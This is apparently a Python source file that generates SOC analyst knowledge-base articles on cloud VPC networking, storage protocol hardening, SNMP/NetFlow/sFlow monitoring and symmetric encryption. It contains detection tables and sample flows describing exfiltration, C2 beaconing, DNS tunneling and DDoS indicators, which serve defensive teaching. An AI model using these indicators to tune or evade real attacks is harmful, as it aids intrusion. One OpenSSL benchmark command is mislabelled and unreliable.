  100    TCP       443       0.0.0.0/0      ALLOW
  110    TCP       80        0.0.0.0/0      ALLOW
  120    TCP       1024-65535 0.0.0.0/0     ALLOW  (ephemeral/return)
  130    TCP       22        10.0.99.0/24   ALLOW  (SSH from mgmt)
  *      All       All       0.0.0.0/0      DENY   (implicit)

Outbound Rules:
  Rule#  Protocol  Port      Destination    Action
  100    TCP       443       0.0.0.0/0      ALLOW
  110    TCP       80        0.0.0.0/0      ALLOW
  120    TCP       1024-65535 0.0.0.0/0     ALLOW  (ephemeral/return)
  *      All       All       0.0.0.0/0      DENY   (implicit)
```

## Internet and NAT Gateways

```text
Internet Gateway (IGW):
  - Provides internet access for public subnets
  - 1:1 NAT for instances with public/Elastic IPs
  - Horizontally scaled, redundant, no bandwidth constraints
  - No security filtering (rely on SGs and NACLs)

NAT Gateway:
  - Allows private subnet instances to reach internet
  - Outbound only -- internet cannot initiate connections
  - Managed service, scales automatically
  - Has a public IP (Elastic IP)
  - Costs: per hour + per GB processed

  [Private Instance] --> [NAT Gateway (public subnet)] --> [IGW] --> Internet
                                   |
                        (Source IP translated to NAT GW public IP)
```

## VPC Peering and Transit Gateway

### VPC Peering

```text
VPC-A (10.0.0.0/16) <--peering--> VPC-B (172.16.0.0/16)

- Direct connection between two VPCs
- No transitive routing (A-B and B-C does NOT mean A-C)
- Can be cross-account and cross-region
- Route table entries required in both VPCs

# Route in VPC-A
Destination: 172.16.0.0/16 -> Target: pcx-abc123
# Route in VPC-B
Destination: 10.0.0.0/16 -> Target: pcx-abc123
```

### Transit Gateway

```text
                    +-------------------+
                    |  Transit Gateway  |
                    +---+----+----+---+-+
                        |    |    |   |
                 +------+  +-+--+ +--+-----+  +--------+
                 |VPC-A |  |VPC-B| |VPC-C   |  |On-Prem |
                 |Prod  |  |Dev  | |Shared  |  |VPN/DX  |
                 +------+  +----+  +--------+  +--------+

- Hub-and-spoke model for connecting multiple VPCs
- Supports transitive routing
- Centralized network control
- Route tables control which VPCs can communicate
- Integrates with VPN and Direct Connect
```

## VPC Flow Logs

Flow logs capture metadata about network traffic in your VPC:

```text
# VPC Flow Log format (AWS default v2)
version account-id interface-id srcaddr dstaddr srcport dstport protocol packets bytes start end action log-status

# Example entries:
2 123456789012 eni-abc123 10.0.1.50 203.0.113.5 49832 443 6 15 12500 1708012345 1708012400 ACCEPT OK
2 123456789012 eni-abc123 198.51.100.9 10.0.1.50 44123 22 6 3 180 1708012345 1708012400 REJECT OK
```

### Flow Log Fields

| Field | Description | SOC Use |
|---|---|---|
| srcaddr / dstaddr | Source and destination IP | Identify communicating hosts |
| srcport / dstport | Source and destination port | Identify services and protocols |
| protocol | IP protocol number (6=TCP, 17=UDP) | Protocol analysis |
| packets / bytes | Traffic volume | Detect exfiltration, scanning |
| action | ACCEPT or REJECT | Identify blocked attempts |
| interface-id | ENI receiving/sending traffic | Map to specific instance |

### Flow Log Analysis for SOC

| Pattern | Possible Threat |
|---|---|
| Rejected connections to many ports on one host | Port scan |
| Accepted connections to unexpected outbound ports | C2 or tunneling |
| Large outbound bytes to external IP at night | Data exfiltration |
| Connections between isolated subnets | Network segmentation bypass |
| Traffic to known malicious IPs | Active compromise |
| No flow logs for a period | Logging disabled (tampering?) |

## Cloud Security Posture Checklist

| Control | Check | Risk if Missing |
|---|---|---|
| Default SG locked down | No allow-all rules in default SG | Unintended access |
| No 0.0.0.0/0 SSH/RDP | SSH/RDP restricted to bastion/VPN | Brute force exposure |
| Flow logs enabled | All VPCs have flow logs | Blind spots |
| No public S3/storage | Buckets require authentication | Data exposure |
| NACLs for deny rules | Block known-bad IP ranges at subnet level | Threat actor access |
| Private subnets for data | Databases in isolated subnets | Direct internet exposure |
| Encryption in transit | TLS between tiers | Data interception |
| Security group reviews | Quarterly review of SG rules | Rule sprawl, over-permissive |

## Key Takeaways for SOC Analysts

- Security groups are stateful (like a mini stateful firewall per instance)
- NACLs are stateless (need explicit rules for both directions)
- VPC flow logs are the cloud equivalent of NetFlow -- essential for investigation
- Always check for overly permissive security groups (0.0.0.0/0 on sensitive ports)
- Cloud networking changes are API-driven -- check CloudTrail for who modified SGs
- Multi-VPC environments need transit gateway visibility for full coverage
"""
    ))

    # -------------------------------------------------------------------------
    # Article 15: Network Storage SAN NAS and iSCSI Security
    # -------------------------------------------------------------------------
    articles.append((
        "Network Storage SAN NAS and iSCSI Security",
        ["infrastructure", "storage", "san", "nas", "iscsi", "data-security"],
        r"""# Network Storage: SAN, NAS, and iSCSI Security

## Overview

Network-attached storage infrastructure holds an organization's most valuable data.
Improperly secured storage systems expose sensitive information, enable data theft,
and provide persistence mechanisms for attackers. SOC analysts must understand storage
protocols, network architectures, and security controls to investigate storage-related
incidents and assess storage security posture.

## Storage Architecture Comparison

| Feature | DAS (Direct Attached) | NAS (Network Attached) | SAN (Storage Area Network) |
|---|---|---|---|
| Connection | Direct to server (SATA, SAS) | Ethernet (TCP/IP) | Fibre Channel or iSCSI |
| Protocol | Block-level (SCSI) | File-level (NFS, SMB) | Block-level (SCSI over FC/IP) |
| Access | Single server | Multiple clients via network | Multiple servers via fabric |
| Performance | High (local) | Good (network dependent) | Highest (dedicated fabric) |
| Scalability | Limited | Good | Excellent |
| Use Case | Small server storage | File shares, home dirs | Databases, VMs, enterprise apps |
| Cost | Low | Medium | High |

## Storage Protocols

### File-Level Protocols (NAS)

| Protocol | OS Support | Port | Authentication | Encryption |
|---|---|---|---|---|
| NFS v3 | Linux/Unix | TCP/UDP 2049 | Host-based (IP/hostname) | None (plaintext) |
| NFS v4 | Linux/Unix | TCP 2049 | Kerberos (RPCSEC_GSS) | Optional (krb5p) |
| SMB/CIFS v1 | Windows | TCP 445 | NTLM | None (deprecated!) |
| SMB v2/v3 | Windows/Linux | TCP 445 | Kerberos/NTLM | SMB3: AES encryption |

### Block-Level Protocols (SAN)

| Protocol | Transport | Port | Performance | Common Use |
|---|---|---|---|---|
| Fibre Channel (FC) | Dedicated FC fabric | N/A (own network) | Highest | Enterprise data centers |
| iSCSI | TCP/IP (Ethernet) | TCP 3260 | Good | Mid-market, virtualization |
| FCoE | Ethernet (lossless) | N/A (Ethernet) | High | Converged networks |
| NVMe-oF | RDMA or TCP | Varies | Very High | High-performance computing |

## NAS Security Hardening

### NFS Security Configuration

```text
# /etc/exports - NFS server configuration

# Insecure (avoid):
/data *(rw,sync)                    # World-accessible, read-write

# Secure:
/data 10.0.20.0/24(rw,sync,no_subtree_check,root_squash)
/backup 10.0.20.10(ro,sync,all_squash,anonuid=65534,anongid=65534)

Security options:
  root_squash    - Maps root to anonymous user (prevent remote root)
  all_squash     - Maps all users to anonymous
  no_subtree_check - Improves reliability
  sec=krb5p      - Kerberos with privacy (encryption)
```

```text
# NFSv4 with Kerberos encryption
/data gss/krb5p(rw,sync,no_subtree_check)

# /etc/idmapd.conf
[General]
Domain = corp.local

[Mapping]
Nobody-User = nfsnobody
Nobody-Group = nfsnobody
```

### SMB/CIFS Security Configuration

```text
# /etc/samba/smb.conf - Samba configuration

[global]
    # Require SMB3 (disable SMBv1)
    server min protocol = SMB3
    client min protocol = SMB3

    # Require signing
    server signing = mandatory
    client signing = mandatory

    # Require encryption (SMB3)
    smb encrypt = required

    # Authentication
    security = ADS
    realm = CORP.LOCAL
    workgroup = CORP

    # Disable guest access
    map to guest = never
    restrict anonymous = 2

    # Logging
    log file = /var/log/samba/%m.log
    log level = 2
    max log size = 5000

[secure_share]
    path = /data/secure
    valid users = @finance-team
    read only = no
    create mask = 0660
    directory mask = 0770
    vfs objects = full_audit
    full_audit:prefix = %u|%I|%m|%S
    full_audit:success = open opendir write unlink rename mkdir rmdir
    full_audit:failure = all
    full_audit:facility = local5
    full_audit:priority = notice
```

### Windows SMB Hardening

```powershell
# Disable SMBv1 (critical security measure)
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
Disable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol

# Require SMB signing
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force

# Require SMB encryption
Set-SmbServerConfiguration -EncryptData $true -Force

# Audit SMB access
Set-SmbShare -Name "Finance" -SecurityDescriptor "O:BAG:BAD:(A;;FA;;;BA)(A;;FR;;;DU)"

# View current SMB sessions
Get-SmbSession | Select-Object ClientComputerName, ClientUserName, NumOpens
```

## SAN Security

### Fibre Channel Zoning

Zoning restricts which devices can communicate over the FC fabric, similar to
VLANs in Ethernet networking.

```text
Zoning Types:
  Port Zoning:   Based on physical switch port
  WWN Zoning:    Based on World Wide Name (like MAC address)
  Mixed Zoning:  Combination of port and WWN

Example zone configuration (Brocade):
  zonecreate "Zone_WebServer_LUN1", "50:00:00:00:00:00:00:01; 50:00:00:00:00:00:00:10"
  cfgadd "ProductionConfig", "Zone_WebServer_LUN1"
  cfgenable "ProductionConfig"
```

### LUN Masking

LUN masking controls which servers can see and access specific Logical Unit Numbers
(storage volumes) on the SAN:

```text
Without LUN Masking:
  Server A can see: LUN 0, LUN 1, LUN 2, LUN 3
  Server B can see: LUN 0, LUN 1, LUN 2, LUN 3
  Risk: Server B could access Server A's data

With LUN Masking:
  Server A can see: LUN 0, LUN 1  (its assigned storage)
  Server B can see: LUN 2, LUN 3  (its assigned storage)
  Protection: Each server only accesses its own LUNs
```

### iSCSI Security Configuration

```text
# iSCSI target configuration (/etc/tgt/conf.d/iscsi.conf)
<target iqn.2026-01.com.corp:storage.lun1>
    backing-store /dev/sdb

    # CHAP authentication (mutual)
    incominguser initiator-user SECRET_PASSWORD_1
    outgoinguser target-user SECRET_PASSWORD_2

    # Restrict by initiator address
    initiator-address 10.0.20.10
    initiator-address 10.0.20.11

    # Restrict by initiator name
    initiator-name iqn.2026-01.com.corp:server01
</target>
```

```text
# iSCSI initiator configuration
iscsiadm -m discovery -t sendtargets -p 10.0.30.100:3260

# Login with CHAP authentication
iscsiadm -m node -T iqn.2026-01.com.corp:storage.lun1 \
    --op update -n node.session.auth.authmethod -v CHAP
iscsiadm -m node -T iqn.2026-01.com.corp:storage.lun1 \
    --op update -n node.session.auth.username -v initiator-user
iscsiadm -m node -T iqn.2026-01.com.corp:storage.lun1 \
    --op update -n node.session.auth.password -v SECRET_PASSWORD_1
iscsiadm -m node -T iqn.2026-01.com.corp:storage.lun1 --login
```

## Storage Network Segmentation

```text
Best Practice: Dedicated Storage Network

+------------------+     +------------------+
| Production VLAN  |     | Storage VLAN     |
| 10.0.20.0/24     |     | 10.0.30.0/24     |
|                  |     |                  |
| [App Server]-----+-----+-[iSCSI NIC]      |
| [DB Server]------+-----+-[iSCSI NIC]      |
|                  |     |                  |
+------------------+     | [SAN Controller] |
                         | [NAS Filer]      |
                         +------------------+

Key principles:
- Storage traffic on separate VLAN/subnet
- Dedicated NICs for storage traffic (dual-homed servers)
- No routing between storage network and user networks
- Firewall rules restrict storage protocol ports
- Management interfaces on management VLAN only
```

## Data Encryption at Rest

| Method | Description | Performance Impact |
|---|---|---|
| Full Disk Encryption (FDE) | Hardware encryption on drive | Minimal (hardware offload) |
| Self-Encrypting Drives (SED) | Drive-level encryption (OPAL) | Minimal (transparent) |
| Volume Encryption | OS-level encryption (LUKS, BitLocker) | Low-moderate |
| File-Level Encryption | Individual file encryption | Moderate (per-file overhead) |
| Database TDE | Transparent Data Encryption | Low-moderate |
| Array-Level Encryption | Storage array encrypts all data | Minimal (hardware offload) |

### LUKS Encryption for Linux Storage

```bash
# Create encrypted volume
cryptsetup luksFormat /dev/sdb1 --cipher aes-xts-plain64 --key-size 256

# Open encrypted volume
cryptsetup luksOpen /dev/sdb1 secure_storage

# Create filesystem
mkfs.ext4 /dev/mapper/secure_storage

# Mount
mount /dev/mapper/secure_storage /mnt/secure

# Add key backup
cryptsetup luksHeaderBackup /dev/sdb1 --header-backup-file /backup/luks-header.bak
```

## Storage Security Monitoring

### Key Storage Events for SOC

| Event | Source | Concern |
|---|---|---|
| Unauthorized share access attempts | SMB/NFS audit logs | Reconnaissance or lateral movement |
| Mass file access in short time | File audit logs | Ransomware or data theft |
| New share created | Storage admin logs | Unauthorized data staging |
| Permission changes on sensitive shares | SMB/NFS audit logs | Privilege escalation |
| Storage replication to new target | SAN management logs | Data exfiltration |
| iSCSI login from unknown initiator | iSCSI target logs | Unauthorized storage access |
| LUN masking changes | SAN management logs | Unauthorized configuration change |
| Encryption key access | Key management logs | Potential data compromise |

## Storage Security Checklist

| Category | Control | Priority |
|---|---|---|
| Protocol | Disable SMBv1, require SMB3 with encryption | Critical |
| Protocol | Use NFSv4 with Kerberos (krb5p) | High |
| Access | Implement LUN masking and FC zoning | Critical |
| Access | Use CHAP authentication for iSCSI | High |
| Network | Isolate storage on dedicated VLAN | Critical |
| Encryption | Enable encryption at rest | High |
| Logging | Enable access auditing on all shares | Critical |
| Admin | Restrict management interface access | Critical |
| Backup | Encrypt and protect backup data | High |
| Monitoring | Alert on mass file operations | High |

## Key Takeaways for SOC Analysts

- SMBv1 is a critical vulnerability (EternalBlue) -- verify it is disabled everywhere
- Storage audit logs are essential for detecting ransomware and data theft
- SAN zoning and LUN masking prevent lateral access to storage volumes
- iSCSI without CHAP authentication allows any host to connect to storage
- Mass file access patterns (rapid open/read/write) indicate ransomware activity
- Storage network segmentation prevents attackers from reaching storage directly
"""
    ))

    # -------------------------------------------------------------------------
    # Article 16: Network Monitoring with SNMP NetFlow and sFlow
    # -------------------------------------------------------------------------
    articles.append((
        "Network Monitoring with SNMP NetFlow and sFlow",
        ["infrastructure", "snmp", "netflow", "sflow", "network-monitoring", "traffic-analysis"],
        r"""# Network Monitoring with SNMP, NetFlow, and sFlow

## Overview

Network monitoring provides visibility into traffic patterns, device health, and security
anomalies. SNMP monitors device status and performance, while NetFlow and sFlow capture
traffic metadata for behavioral analysis. Together they give SOC analysts the data needed
to detect anomalies, investigate incidents, and understand normal network behavior.

## SNMP (Simple Network Management Protocol)

### SNMP Versions

| Version | Authentication | Encryption | Security Level |
|---|---|---|---|
| SNMPv1 | Community string (plaintext) | None | Insecure (do not use) |
| SNMPv2c | Community string (plaintext) | None | Insecure (widely used) |
| SNMPv3 noAuthNoPriv | Username only | None | Low |
| SNMPv3 authNoPriv | HMAC-MD5 or HMAC-SHA | None | Medium |
| SNMPv3 authPriv | HMAC-SHA-256/384/512 | AES-128/256 | High (recommended) |

### SNMP Architecture

```text
[SNMP Manager]  <----GET/SET---->  [SNMP Agent on Device]
(NMS/SIEM)      <----TRAP/INFORM-- [Router/Switch/Server]
    |                                     |
    |           UDP 161 (queries)         |
    |           UDP 162 (traps)           |
    |                                     |
[MIB Database]                     [MIB on Device]
(OID definitions)                  (OID values)
```

### SNMP Operations

| Operation | Direction | Purpose |
|---|---|---|
| GET | Manager -> Agent | Retrieve specific OID value |
| GETNEXT | Manager -> Agent | Retrieve next OID in tree |
| GETBULK | Manager -> Agent | Retrieve multiple OIDs efficiently (v2c/v3) |
| SET | Manager -> Agent | Modify a value on the device |
| TRAP | Agent -> Manager | Asynchronous alert from device |
| INFORM | Agent -> Manager | Acknowledged trap (v2c/v3) |

### Common SNMP OIDs for Security Monitoring

| OID | Name | Value |
|---|---|---|
| 1.3.6.1.2.1.1.1.0 | sysDescr | Device description and firmware |
| 1.3.6.1.2.1.1.3.0 | sysUpTime | Time since last reboot |
| 1.3.6.1.2.1.2.2.1.10 | ifInOctets | Interface input bytes |
| 1.3.6.1.2.1.2.2.1.16 | ifOutOctets | Interface output bytes |
| 1.3.6.1.2.1.2.2.1.14 | ifInErrors | Interface input errors |
| 1.3.6.1.2.1.2.2.1.13 | ifInDiscards | Interface input discards |
| 1.3.6.1.2.1.4.3.0 | ipInReceives | Total IP packets received |
| 1.3.6.1.2.1.6.9.0 | tcpCurrEstab | Current TCP connections |
| 1.3.6.1.4.1.9.9.109.1.1.1.1.3 | cpmCPUTotal1min | Cisco CPU 1-min avg |
| 1.3.6.1.4.1.9.9.48.1.1.1.5 | ciscoMemoryPoolUsed | Cisco memory used |

### SNMP Querying Examples

```bash
# Query system description (SNMPv2c)
snmpget -v 2c -c COMMUNITY_STRING 10.0.1.1 sysDescr.0

# Walk entire interface table
snmpwalk -v 2c -c COMMUNITY_STRING 10.0.1.1 ifTable

# SNMPv3 query with authentication and encryption
snmpget -v 3 -u monitor-user \
    -l authPriv \
    -a SHA -A AUTH_PASSPHRASE \
    -x AES -X PRIV_PASSPHRASE \
    10.0.1.1 sysUpTime.0

# Bulk query for interface statistics
snmpbulkwalk -v 3 -u monitor-user \
    -l authPriv -a SHA -A AUTH_PASSPHRASE \
    -x AES -X PRIV_PASSPHRASE \
    10.0.1.1 ifHCInOctets
```

### SNMP Security Hardening

```text
! Cisco IOS SNMP hardening
! Remove default community strings
no snmp-server community public
no snmp-server community private

! SNMPv3 configuration
snmp-server group SEC-GROUP v3 priv
snmp-server user sec-user SEC-GROUP v3 \
    auth sha STRONG_AUTH_PASS priv aes 256 STRONG_PRIV_PASS

! Restrict SNMP access by ACL
ip access-list standard SNMP-ALLOWED
    permit 10.0.99.50
    permit 10.0.99.51
    deny any log

snmp-server community READONLY ro SNMP-ALLOWED

! Configure SNMP traps
snmp-server enable traps snmp authentication linkdown linkup
snmp-server enable traps config
snmp-server enable traps syslog
snmp-server host 10.0.99.50 version 3 priv sec-user
```

### SNMP Security Risks

| Risk | Impact | Mitigation |
|---|---|---|
| Default community strings | Full device read (public) or write (private) access | Change defaults, use SNMPv3 |
| Plaintext community strings | Credential sniffing | Use SNMPv3 authPriv |
| SNMP write access | Attacker can modify device config | Use read-only access, disable SET |
| SNMP amplification | DDoS amplification attacks | Restrict to internal, rate-limit |
| MIB information disclosure | Reveals network topology, versions | Restrict access, use ACLs |

## NetFlow / IPFIX

### What NetFlow Captures

NetFlow records metadata about network conversations (flows), not packet payloads.

```text
A flow is defined by 5-tuple (or 7-tuple):
  Source IP + Destination IP + Source Port + Destination Port + Protocol
  (+ ToS + Input Interface for 7-tuple)

NetFlow Record Fields:
  Source IP:        10.0.1.50
  Destination IP:   203.0.113.5
  Source Port:      49832
  Destination Port: 443
  Protocol:         TCP (6)
  Packets:          150
  Bytes:            125,400
  Start Time:       2026-02-15 14:30:00
  End Time:         2026-02-15 14:35:00
  TCP Flags:        SYN, ACK, PSH, FIN
  Input Interface:  Gi0/1
  Output Interface: Gi0/0
  Next Hop:         10.0.0.1
  ToS:              0
  AS Numbers:       src 65001, dst 15169
```

### NetFlow Versions

| Version | Key Features | Status |
|---|---|---|
| NetFlow v5 | Fixed format, IPv4 only | Legacy, still widely used |
| NetFlow v9 | Template-based, flexible fields, IPv6 | Current Cisco standard |
| IPFIX | Standards-based (RFC 7011), extends NetFlow v9 | Industry standard |
| Flexible NetFlow | User-defined fields, Cisco enhancement | Cisco advanced |

### NetFlow Configuration (Cisco IOS)

```text
! Configure NetFlow v9 exporter
flow exporter SIEM-EXPORTER
    destination 10.0.99.50
    source Loopback0
    transport udp 2055
    template data timeout 60

! Configure flow monitor
flow monitor SECURITY-MONITOR
    exporter SIEM-EXPORTER
    record netflow ipv4 original-input
    cache timeout active 60
    cache timeout inactive 15

! Apply to interfaces
interface GigabitEthernet0/0
    ip flow monitor SECURITY-MONITOR input
    ip flow monitor SECURITY-MONITOR output
```

## sFlow

### sFlow vs NetFlow

| Feature | NetFlow | sFlow |
|---|---|---|
| Sampling Method | Every packet (or sampled) | Statistical sampling (1-in-N) |
| Export Format | Flow records (aggregated) | Packet headers + counters |
| Processing Load | Higher (tracks every flow) | Lower (samples) |
| Accuracy | Exact (unsampled) or estimated | Statistical estimate |
| Multi-vendor | Cisco-centric (IPFIX is standard) | Multi-vendor from inception |
| Layer 2 Visibility | Limited | Full (includes MAC, VLAN) |
| Real-time | Near real-time (cache timeout) | Near real-time (sample rate) |

### sFlow Configuration

```text
! sFlow configuration (generic switch)
sflow 1 destination 10.0.99.50 6343
sflow 1 polling 20
sflow 1 sampling 1000

! Apply to interface
interface ethernet 1/1
    sflow 1 sampling 512
    sflow 1 polling 10

! sFlow sample rates by link speed
! 100 Mbps:  1-in-200 to 1-in-500
! 1 Gbps:    1-in-1000 to 1-in-2000
! 10 Gbps:   1-in-2000 to 1-in-5000
! 40/100 Gbps: 1-in-5000 to 1-in-10000
```

### sFlow Sample Record

```text
sFlow Datagram:
  Agent: 10.0.1.1
  Sequence: 12345
  Uptime: 86400000 ms

  Flow Sample:
    Sequence: 67890
    Source Interface: eth1 (index 2)
    Sampling Rate: 1-in-1000
    Sample Pool: 500000
    Input Interface: eth1
    Output Interface: eth2

    Sampled Packet Header (128 bytes):
      Ethernet: src=aa:bb:cc:dd:ee:ff dst=11:22:33:44:55:66 type=0x0800
      IPv4: src=10.0.1.50 dst=203.0.113.5 proto=6 ttl=64
      TCP: sport=49832 dport=443 flags=ACK,PSH seq=12345

  Counter Sample:
    Interface: eth1
    ifSpeed: 1000000000 (1 Gbps)
    ifInOctets: 1234567890
    ifOutOctets: 987654321
    ifInErrors: 0
    ifOutErrors: 0
```

## What Each Protocol Tells SOC Analysts

| Data Need | SNMP | NetFlow/IPFIX | sFlow |
|---|---|---|---|
| Device health (CPU, memory) | Yes | No | Counter samples |
| Interface utilization | Yes | Derived from flows | Counter samples |
| Top talkers (bandwidth) | No | Yes (by IP/port) | Yes (estimated) |
| Connection patterns | No | Yes (flow records) | Yes (sampled) |
| Protocol distribution | No | Yes | Yes |
| DDoS detection | Partial (bandwidth) | Yes (flow anomaly) | Yes (sampling) |
| Lateral movement | No | Yes (east-west flows) | Yes (sampled) |
| Data exfiltration | No | Yes (byte counts) | Yes (estimated) |
| Beaconing detection | No | Yes (periodic flows) | Yes (if sampled) |
| Packet-level analysis | No | No | Partial (headers only) |
| L2 information (MACs, VLANs) | Limited | Limited | Yes |

## Security Monitoring Use Cases

### Detecting Network Anomalies with NetFlow

```text
# Baseline: Normal DNS traffic for host 10.0.1.50
Average DNS queries/hour: 50
Average bytes/DNS flow: 200

# Anomaly detected:
Host 10.0.1.50 -> External DNS (non-corporate)
DNS queries/hour: 5000 (100x baseline)
Average bytes/DNS flow: 4500 (22x baseline)
Query types: TXT records

Verdict: Possible DNS tunneling / exfiltration
Action: Alert SOC, isolate host, investigate
```

### Beaconing Detection

```text
# Normal web browsing pattern (irregular intervals)
10.0.1.50 -> 93.184.216.34:443 at 09:15, 09:32, 10:05, 11:47, ...

# C2 beaconing pattern (regular intervals with jitter)
10.0.1.50 -> 198.51.100.9:443 at 09:00, 09:05, 09:10, 09:15, ...
  Interval: 300 seconds (+/- 15 seconds jitter)
  Byte count: 200-500 bytes each connection
  Duration: Consistent across 24 hours

Detection approach:
  1. Aggregate flows by src_ip + dst_ip + dst_port
  2. Calculate inter-flow timing intervals
  3. Alert on low standard deviation in intervals
  4. Cross-reference destination with threat intelligence
```

### DDoS Detection with Flow Data

```text
Baseline for web server 10.0.2.10:
  Inbound flows/min: 500
  Unique source IPs/min: 200
  Avg packets per flow: 50

DDoS indicators:
  Inbound flows/min: 50,000 (100x baseline)
  Unique source IPs/min: 40,000 (200x baseline)
  Avg packets per flow: 1-3 (SYN flood signature)
  Top protocol: TCP SYN (no ACK)

Alert: Volumetric DDoS attack detected
```

## Collection Architecture

```text
                    [Network Devices]
                    (routers, switches)
                          |
              +-----------+-----------+
              |           |           |
          [NetFlow]   [sFlow]     [SNMP]
          UDP 2055    UDP 6343    UDP 161/162
              |           |           |
              v           v           v
          +-------------------------------+
          |       Flow Collector          |
          | (ntopng, Elastiflow,          |
          |  SiLK, nfdump, sFlowTrend)    |
          +-------------------------------+
                       |
              +--------+--------+
              |                 |
          [SIEM/SOAR]    [Dashboards]
          (correlation)  (visualization)
```

### Popular Collectors

| Collector | Protocols Supported | License |
|---|---|---|
| ntopng | NetFlow, sFlow, IPFIX | Community + Enterprise |
| Elastiflow | NetFlow, sFlow, IPFIX | Open source (Elastic-based) |
| nfdump/nfsen | NetFlow v5/v9, IPFIX | Open source |
| SiLK (CERT/CC) | NetFlow, IPFIX | Open source (analysis toolkit) |
| sFlowTrend | sFlow | Free (InMon) |
| Stealthwatch | NetFlow, IPFIX | Cisco commercial |

## Key Takeaways for SOC Analysts

- SNMP with default community strings is a critical vulnerability -- always check
- NetFlow is the primary data source for network behavior analysis and threat hunting
- sFlow provides good coverage with lower overhead, ideal for high-speed networks
- Beaconing detection using flow data is one of the most effective C2 detection methods
- Combine flow data with threat intelligence for automated IOC matching
- Flow data retention (30-90 days) enables historical investigation of slow-moving threats
- Always correlate flow anomalies with endpoint and log data before escalating
"""
    ))

    return articles


def cryptography_pki_articles():
    """Return 16 cryptography and PKI articles for the SOC analyst knowledge base."""
    articles = []

    # --------------------------------------------------------------------------
    # Article 1: Symmetric Encryption AES DES and Block Ciphers
    # --------------------------------------------------------------------------
    articles.append((
        "Symmetric Encryption AES DES and Block Ciphers",
        ["cryptography", "symmetric-encryption", "aes", "des", "block-ciphers", "encryption"],
        r"""# Symmetric Encryption: AES, DES, and Block Ciphers

## Overview

Symmetric encryption uses the **same key** for both encryption and decryption. It is the
workhorse of modern cryptography, protecting data at rest and in transit. Understanding
symmetric ciphers is essential for SOC analysts evaluating encryption configurations,
investigating breaches, and assessing compliance.

## Block Ciphers vs Stream Ciphers

| Property         | Block Cipher                        | Stream Cipher                    |
|------------------|-------------------------------------|----------------------------------|
| Unit of work     | Fixed-size blocks (64/128 bits)     | One bit or byte at a time        |
| Speed            | Fast with hardware acceleration     | Very fast in software            |
| Error propagation| Depends on mode                     | Single-bit errors stay isolated  |
| Examples         | AES, DES, 3DES, Blowfish           | RC4, ChaCha20, Salsa20           |
| Use cases        | Disk encryption, TLS bulk data      | TLS (ChaCha20), legacy Wi-Fi     |

## DES and 3DES (Legacy)

**DES** (Data Encryption Standard) uses a 56-bit key and 64-bit blocks. It was broken by
brute force in 1999 (22 hours). **Never use DES in production.**

**3DES** applies DES three times with two or three keys (112 or 168 effective bits).
It is slow and deprecated by NIST as of 2023.

```
DES:   C = E_K(P)                 56-bit key
3DES:  C = E_K3(D_K2(E_K1(P)))   112 or 168-bit effective key
```

## AES Deep Dive

AES (Advanced Encryption Standard, Rijndael) replaced DES in 2001.

| Property       | AES-128       | AES-192       | AES-256       |
|----------------|---------------|---------------|---------------|
| Key size       | 128 bits      | 192 bits      | 256 bits      |
| Block size     | 128 bits      | 128 bits      | 128 bits      |
| Rounds         | 10            | 12            | 14            |
| Security level | 128-bit       | 192-bit       | 256-bit       |

AES operates on a 4x4 byte state matrix. Each round performs:

1. **SubBytes** - non-linear S-box substitution
2. **ShiftRows** - cyclic row shifting
3. **MixColumns** - column mixing (skipped in final round)
4. **AddRoundKey** - XOR with round key

### Hardware Acceleration

Modern CPUs include AES-NI instructions. Check support:

```bash
# Linux - check for AES-NI
grep -o aes /proc/cpuinfo | head -1

# Windows PowerShell
Get-CimInstance Win32_Processor | Select-Object Name
# Then check vendor spec sheet for AES-NI support

# OpenSSL speed test with and without AES-NI
openssl speed -evp aes-256-gcm
openssl speed -evp aes-256-gcm -engine rdrand
```

## Modes of Operation

Modes define how block ciphers handle data larger than one block.

### ECB (Electronic Codebook) - NEVER USE

Each block encrypted independently. Identical plaintext blocks produce identical
ciphertext blocks, leaking patterns.

```
Block1 -> E_K -> Cipher1
Block2 -> E_K -> Cipher2    # If Block1 == Block2, then Cipher1 == Cipher2
```

### CBC (Cipher Block Chaining)

Each block XORed with previous ciphertext before encryption. Requires an IV.

```
C_0 = IV
C_i = E_K(P_i XOR C_{i-1})
```

- Sequential encryption (cannot parallelize)
- Padding required (PKCS#7)
- Vulnerable to padding oracle attacks if not authenticated

### CTR (Counter Mode)

Turns a block cipher into a stream cipher. Encrypts a counter, XORs with plaintext.

```
C_i = P_i XOR E_K(Nonce || Counter_i)
```

- Fully parallelizable
- No padding needed
- Random access to any block
- Nonce reuse is catastrophic

### GCM (Galois/Counter Mode) - RECOMMENDED

CTR mode plus built-in authentication (AEAD). Produces ciphertext and authentication tag.

```bash
# Encrypt a file with AES-256-GCM using OpenSSL
openssl enc -aes-256-gcm -in secret.txt -out secret.enc -K $(xxd -l 32 -p /dev/urandom) -iv $(xxd -l 12 -p /dev/urandom)

# In practice, use openssl cms or a proper library
```

| Mode | Parallelizable | Authentication | Padding | Recommended |
|------|---------------|----------------|---------|-------------|
| ECB  | Yes           | No             | Yes     | NEVER       |
| CBC  | Decrypt only  | No             | Yes     | Legacy only |
| CTR  | Yes           | No             | No      | With MAC    |
| GCM  | Yes           | Yes (AEAD)     | No      | YES         |
| CCM  | No            | Yes (AEAD)     | No      | Wi-Fi (AES) |

## Practical OpenSSL Commands

```bash
# Generate a random 256-bit key
openssl rand -hex 32

# Encrypt file with AES-256-CBC (password-based)
openssl enc -aes-256-cbc -salt -pbkdf2 -in plaintext.txt -out encrypted.bin

# Decrypt
openssl enc -d -aes-256-cbc -pbkdf2 -in encrypted.bin -out decrypted.txt

# List supported ciphers
openssl enc -list

# Benchmark AES performance
openssl speed aes-128-cbc aes-256-cbc aes-128-gcm aes-256-gcm
```

## Key Size Selection Guide

| Use Case                  | Minimum       | Recommended   |
|---------------------------|---------------|---------------|
| General data protection   | AES-128       | AES-256       |
| Government classified     | AES-256       | AES-256       |
| PCI DSS compliance        | AES-128       | AES-256       |
| HIPAA compliance          | AES-128       | AES-256       |
| Long-term archival (>10y) | AES-256       | AES-256       |

## SOC Analyst Checklist

- Verify no ECB mode in use (check TLS configs, application code)
- Ensure AES key sizes are at least 128 bits
- Confirm GCM or other AEAD modes for new implementations
- Check that IVs/nonces are never reused with the same key
- Verify DES and 3DES are not in use (compliance violation)
- Monitor for downgrade attacks that force weaker ciphers
- Review key management practices (rotation, storage)

## Common Indicators of Weak Encryption

```
# In packet captures or configs, look for:
DES-CBC3-SHA          # 3DES - deprecated
